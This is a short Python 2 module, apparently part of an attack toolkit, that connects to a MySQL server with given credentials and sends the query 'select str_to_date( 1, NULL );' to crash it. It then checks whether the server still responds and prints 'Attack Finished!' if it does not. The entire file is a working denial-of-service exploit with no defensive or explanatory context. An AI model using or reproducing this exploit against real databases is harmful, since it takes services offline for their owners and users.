# coding:utf-8

import mysql.connector


class mysql_dos3:
    def __init__(self):
        pass

    def setDBInfo(self, dbinfo):
        self.dbip = dbinfo[1]
        self.dbname = dbinfo[8]
        self.dbpwd = dbinfo[9]

    def pro(self):
        self.connToDB()

    def connToDB(self):
        config = {'host': self.dbip, 'user': self.dbname, 'password': self.dbpwd, 'port': 3306}
        try:
            self.mysql = mysql.connector.connect(**config)
        except mysql.connector.Error as e:
            print "Connect to DB Failed!Failure is {}".format(e)
            print "Attack Failed!"
            return

        print "Connect to DataBase Success!"
        print "Attack Now!"

        self.dbcur = self.mysql.cursor()

        try:
            self.dbcur.execute("select str_to_date( 1, NULL );")
        except mysql.connector.Error as e:
            print "DB Failed!Failure is {}".format(e)

        try:
            self.dbcur.execute("select 1 from dual;")
            self.dbcur.fetchall()
        except mysql.connector.Error as e:
            print "Attack Finished!"
